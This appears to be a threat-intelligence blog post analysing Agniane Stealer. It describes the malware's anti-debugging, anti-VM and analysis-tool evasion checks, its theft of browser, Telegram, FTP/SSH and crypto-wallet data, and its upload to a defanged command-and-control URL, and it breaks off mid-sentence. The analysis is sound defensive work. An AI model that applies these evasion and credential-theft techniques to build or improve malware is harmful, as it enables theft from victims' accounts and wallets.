Introduction
Agniane Stealer fraudulently takes credentials, system information, and session details from browsers, tokens, and file transferring tools.
Agniane Stealer also heavily targets cryptocurrency extensions and wallets. Once it obtains the sensitive data, Agniane Stealer transfers that
stolen data to command-and-control [C&C] servers, where threat actors can act upon the stolen information.  

We believe Agniane Stealer belongs to the Malware-as-a-Service (MaaS) platform Cinoshi Project, which was discovered in early 20231, and
much of its code infrastructure is modeled after the platform. Its close relationship to Cinoshi Project means Agniane Stealer has been
available for sale on several dark web forums. The threat actors responsible for Agniane Stealer utilize packers to maintain and regularly
update the malware‚Äôs functionality and evasions features.

Technical Analysis
Agniane Stealer, like many other information stealers, is written in C#. Our team determined that the Agniane Stealer sample under analysis
is the first version of the build and was not packed or obfuscated, but the latest version has undergone packing and obfuscation. 

Upon execution, Agniane Stealer generates a random 32-bit string using the character set ‚ÄúA-Z0-9‚Äù. The generated random string is used as
the sub-folder name, which is created in the %TEMP% folder. This is where the stolen data is kept.

After that, the Agniane Stealer extracts a C&C URL (‚Äúhttps[ : ]//central-cee-doja [.] ru/‚Äù) from a hardcoded Base64 string.

Anti-Analysis Techniques

Checks for debugger 
The malware sample calls the CheckRemoteDebuggerPresent Windows API to check if it's being run in a debugger. If Agniane Stealer
detects a debugger, then it will exit from memory and stop running, making debugging harder. 

5/13



Verifies tick counts 
Agniane Stealer uses an emulator program to record the initial tick count, proceeds to sleep, and upon awakening, measures the tick count
once more. If the difference between the initial and final tick counts is less than 10L, the program returns True, exits from memory, and stops
running.

Detects analysis tools
Agniane Stealer checks the memory for analysis tools. If it finds an analysis tool running, Agniane Stealer will exit. Our analysis uncovered
the following analysis tools:

Processhacker
Netstat
Netmon
Tcpview
Wireshark
Filemon
Regmon
cain

Locates user‚Äôs system
Hosting providers employ various security measures for malware detection. It is in the interest of the threat actors to remain undetected.
Thus, the future course of execution is determined based on the geolocation data retrieved from the server using the request  hxxp[:]//ip-
api[.]com/line/fields=hosting. If the victim‚Äôs machine belongs to a hosting provider, execution is terminated.

Obscures identity with legitimate DLL handles 
Agniane Stealer tries to obtain the handle of several DLLs using the GetModuleHandle function. 

If successful, Agniane Stealer uses the innocuous DLL handle to hide itself from potential discovery. The malware targets the following DLLs:

SbieDll
SxIn
Sf2snxhk
cmdvrt32

Identifies virtual machines
Agniane Stealer utilizes the WMI queries to detect whether it is running inside a virtual environment and terminates execution if True.

QUERY DETAILS
Select * from If Manufacturer is Microsoft corporation and Model is VIRTUAL return True or if either Manufacturer
Win32_ComputerSystem contains vmware or Model is VirtualBox return True, and malware exits from memory.

SELECT * FROM Retrieves information about video controllers (also known as graphics cards) on a Windows computer. Uses
Win32_VideoController the GetPropertyValue method to compare names with VMware and VBox. If a match is found, then True is

returned and Agniane Stealer quits execution.

Stealer Capabilities 
Agniane Stealer possesses several form-grabbing capabilities. Let‚Äôs dive into those.

Sidesteps dependencies
Upon execution, Agniane Stealer, with a compact sample size, adeptly operates on both 32 and 64-bit systems, sidestepping any reliance on
pre-existing dependencies. 

Intriguingly, it dynamically retrieves a set of 5 DLLs from its C&C servers, leveraging legitimate third-party DLLs to enhance its functionalities
and capabilities. It employs the following:

SQLite.dll
SQLite.EF6.dll
SQLite.Linq.dll
SQLite.Interop.dll(x86 & x64bit)

Steals from the following areas:

6/13



AREAS DETAILS
Telegram Steals user tokens for logged-in Discord and Steam sessions, and OpenVPN profiles; sends data to threat actors.
and Steam Tries to search Telegram software under the ‚Äú\\AppData\\Roaming\\Telegram‚Äù directory. If found, Agniane Stealer
Sessions steals Telegram Sessions  and archives it.

Tries to locate the Telegram process. If found, the malware kills the process and grabs all the Telegram files except
emojis and user_data. Then, Agniane Stealer archives all remaining directories.

Browser Agniane Stealer targets login data, history, and web data from the following browsers:
cookies

OperaGX
Chrome
Opera
FireFox
Vivaldi
Brave
Edge
Yandex
Chromium

Domains Agniane Stealer tries to harvest login credentials and cookies from following domains:

VK.com
facebook.com
instagram.com
mail.ru

If any passwords are found in the domains listed above, then Agniane Stealer places them into the Important Detects.txt file
and archives them.

SSH File Agniane Stealer pilfers WinSCP to collect Hostname, username, and password from all sessions by traversing through
Transfer Software\\Martin Prikryl\\WinSCP 2\\Sessions registry entry.
Protocol

Filezilla Agniane Stealer reads FileZilla\\recentservers.xml and searches for the <server> tag. If available, then Agniane Stealer
FTP grabs Hostname, username, and password. If the XML path was not found, then Agniane Stealer logs that it was unable to
Software find the FileZilla session.

Computer Agniane Stealer gets the external IP address of the victim's machine using https://ipwho.is/?output=xml.
System

In addition, Agniane Stealer collects victims Windows version using SELECT * FROM win32_operatingsystem. Then, it
obtains the bit version of the machine using Windows Registry and checks the value. If the value matches, then it is x86 but
if it doesn‚Äôt then that indicates a x64bit machine.

Uses WMI to collect
Installed Antiviruses: Collects all installed antivirus software with the WMI query Select * from AntivirusProduct.
GPUName: Using WMI query SELECT * FROM Win32_VideoController and GetEnumerator() method Compares with "VMware SVGA
3D"
CPU name: Using WMI query SELECT * FROM Win32_Processor tries to access the CPU name of the victim's machine.

Captures a screenshot
Agniane Stealer captures a screenshot of the victim‚Äôs desktop using Bitmap.

Checks RAM
By querying WMI to Select * From Win32_ComputerSystem, Agniane Stealer calculates RAM allocated to the victim's machine. 

Exfiltrates data
Agniane Stealer enumerates the users Desktop and the Documents folder for the files with .txt,.doc,.mafile,.rdp, and .db extension. The
discovered files are then copied to the previously created subfolder under the %TEMP% location.

Finds installed applications
Agniane Stealer collects all applications installed on the victim‚Äôs machine by querying the Registry Key
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall. Then, it stores that information in the Installed Apps.txt file, as you can see in
the image below.

Figure 9: Example information collected by Agniane Stealer

Agniane Stealer keeps a record of its actions in a file named execution log.txt, which documents all the operations executed and associated
information.

Exfiltrates crypto data
In addition to form-grabbing, Agniane Stealer also utilizes clipper qualities to exfiltrate cryptocurrency data. 

Agniane Stealer is a prolific cryptocurrency data exfiltrator with extensive support for nearly 70+ crypto extensions and 10+ crypto wallets.
See the Crypto Extension & Wallet table at the bottom of this blog for a complete list.

How it works
Agniane Stealer uploads all the exfiltrated data to: 

hxxps[:]//central-cee-doja.ru/TEST.php?
ownerid=REPLACEUSER1D&buildid=spriteuser&countp=2&countc=29&username=saturn&country=IN&ipaddr=XX.XX.XX.XX&BSSID=XXXXXX0

After uploading the stolen data to a remote server, the Agniane Stealer removes its traces from the victim‚Äôs system by deleting the sub-folder.

We observed that the latest version of the Agniane Stealer uses ConfuserEx Protector. Also, the recent variant employs more obfuscation
techniques when compared to the earlier version, which makes it harder for security modules to detect. 

In the images below, Figure 10 is from the earlier version of Agniane Stealer where the code is human-readable, and Figure 11 is from the
latest version of Agniane Stealer where the same code is obfuscated through ConfuserEx Protector. The Figure 12 is showing the de-
obfuscated code.

C&C Communication
In the case of Agniane Stealer, threat actors are using a command-and-control (C&C) server to move and store stolen data. A C&C server is
a system controlled by the cybercriminals who distribute stealer malware to take sensitive data that allows them to manage and control
compromised devices remotely. 

In the image below, you can see the:
